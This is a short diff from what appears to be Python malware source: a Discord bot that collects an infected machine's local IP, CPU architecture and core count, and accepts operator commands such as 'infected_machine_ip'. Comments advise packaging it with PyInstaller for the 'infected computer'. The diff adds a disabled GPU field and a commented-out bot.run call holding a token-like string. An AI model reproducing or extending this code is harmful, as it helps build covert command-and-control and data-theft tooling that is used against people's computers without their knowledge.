@@ -65,6 +65,7 @@ else:
             {"name": "Local IP (LAN)", "value": local_ip_address, "inline": False},
             {"name": "CPU Architecture", "value": cpu_architecture, "inline": True},
             {"name": "CPU Core Count", "value": str(cpu_core_count), "inline": True},
+            #{"name": "Gpu", "value": no worky try to fix if you use womp womp, "inline": True},
         ],
     }
 
@@ -188,3 +189,4 @@ async def infected_machine_ip(ctx, ip: str): #Format: !infected_machine_ip <Publ
 
 
 bot.run(os.getenv("BOT_TOKEN")) #USE AT YOUR OWN RISK!!!!!! YOU MAY NEED TO SETUP A SEPERATE SERVER TO AVOID EXPOSING YOUR TOKEN TO THE INFECTED COMPUTER. OTHERWISE PUT THE TOKEN THERE THEN PYINSTALLER IT!!!!!
+#bot.run("hgbigHunGgjktGb69420jdhdhu")
